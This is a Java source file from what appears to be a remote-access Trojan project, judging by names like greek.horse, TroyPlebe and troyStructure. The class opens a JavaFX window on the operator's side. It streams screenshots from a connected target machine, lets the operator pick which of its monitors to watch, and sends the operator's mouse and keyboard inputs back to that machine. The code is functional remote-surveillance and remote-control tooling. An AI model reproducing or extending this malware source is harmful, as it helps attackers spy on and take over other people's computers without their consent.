package greek.horse.server.ui.controllers.tasks;

import greek.horse.models.MonitorDesktopWrapper;
import greek.horse.models.UserInput;
import greek.horse.server.troyStructure.TroyPlebe;
import greek.horse.server.troyStructure.request.RecurrentTroyRequest;
import greek.horse.server.ui.ChatApp;
import greek.horse.server.ui.controllers.MonitorDesktopController;
import javafx.application.Platform;
import javafx.collections.ListChangeListener;
import javafx.collections.ObservableList;
import javafx.event.EventHandler;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.input.MouseEvent;
import javafx.stage.Stage;
import org.apache.log4j.Logger;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

public class MonitorDesktopTask implements Runnable {
    private final TroyPlebe plebe;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private MonitorDesktopController controller;
    private RecurrentTroyRequest request;
    private Timer timer;

    private static final Logger log = Logger.getLogger(MonitorDesktopController.class);

    public MonitorDesktopTask(TroyPlebe tp) {
        this.plebe = tp;
    }

    @Override
    public void run() {
        AtomicBoolean start = new AtomicBoolean(false);
        Platform.runLater(() -> {
            try {
                Stage stage = new Stage();
                stage.setTitle("Desktop Monitor - " + plebe.getTitle());
                stage.getIcons().add(ChatApp.appIcon);

                FXMLLoader loader = new FXMLLoader(getClass().getClassLoader().getResource("scenes/desktop.fxml"));
                Parent root = loader.load();

                Scene scene = new Scene(root);
                stage.setScene(scene);

                stage.setOnCloseRequest(e -> this.running.set(false));

                controller = loader.getController();
                controller.setStage(stage);
                controller.setTask(this);

                EventHandler<MouseEvent> event = mouseEvent -> {
                    if (running.get()) {
                        refreshSettings();
                    }
                };
                scene.setOnMouseEntered(event);
                scene.setOnMouseExited(event);

                stage.show();

            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                start.set(true);
            }
        });

        loadMonitors();

        while (!start.get()) {
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        startListening();

        while (this.running.get() && this.plebe.getRunning().get()) {
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                log.error(e);
            }
        }

        timer.cancel();
        timer.purge();

        if (this.plebe.getRunning().get() && !request.getReleased().get()) {
            this.plebe.releaseRequest(request);
        }

        Platform.runLater(() -> {
            controller.getStage().hide();
        });

    }

    private void loadMonitors() {
        Platform.runLater(() -> {
            try {
                int count = (int) plebe.getMonitorCount().getReceivedObj();
                ArrayList<String> list = new ArrayList<>();
                for (int i = 1; i <= count; i++) {
                    list.add("Monitor " + i);
                }
                controller.choiceBox.getItems().addAll(list);
            } catch (Exception e) {
                log.error("Failed to get monitors", e);
                controller.choiceBox.getItems().add("Monitor 1");
            } finally {
                controller.configureChoiceBox();
            }
        });

    }

    private void startListening() {
        double w = controller.getStage().getWidth() - 50;
        double h = controller.getStage().getHeight() - 70;

        request = plebe.startScreenCapture(new MonitorDesktopWrapper(w, h, controller.isCompressed(), 0));

        ObservableList<Object> observableList = request.getObservableReceivedObjs();

        long initTime = System.currentTimeMillis();
        AtomicLong frameCount = new AtomicLong();
        ListChangeListener<? super Object> changeListener = listener -> {
            listener.next(); // this is needed for some reason

            // only need one per refresh
            ArrayList<UserInput> inputs = getInputs();
            if (inputs.size() > 0) {
                plebe.sendUserInputs(inputs);
            }

            // as many refreshes as arrived
            for (Object obj : listener.getAddedSubList()) {
                try {
                    BufferedImage bi = ImageIO.read(new ByteArrayInputStream((byte[]) obj));
                    controller.setImage(bi);
                    frameCount.getAndIncrement();
                } catch (Exception e) {
                    log.error("Cast failed, image not set", e);
                }
            }

        };

        observableList.addListener(changeListener);

        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
//                refreshSettings();
                Platform.runLater(() -> {
                    controller.setFpsText((int) (frameCount.get() / Math.floorDiv(System.currentTimeMillis() - initTime, 1000)));
                });
            }
        }, 2000, 2000);
    }

    private ArrayList<UserInput> getInputs() {
        ArrayList<UserInput> list = new ArrayList<>(controller.getInputs());
        return list;
    }

    public void refreshSettings() {
        double w = controller.getStage().getWidth() - 50;
        double h = controller.getStage().getHeight() - 70;
        this.plebe.refreshDesktop(new MonitorDesktopWrapper(w, h, controller.isCompressed(), controller.choiceBox.getSelectionModel().getSelectedIndex()));
    }

    public AtomicBoolean getRunning() {
        return running;
    }
}
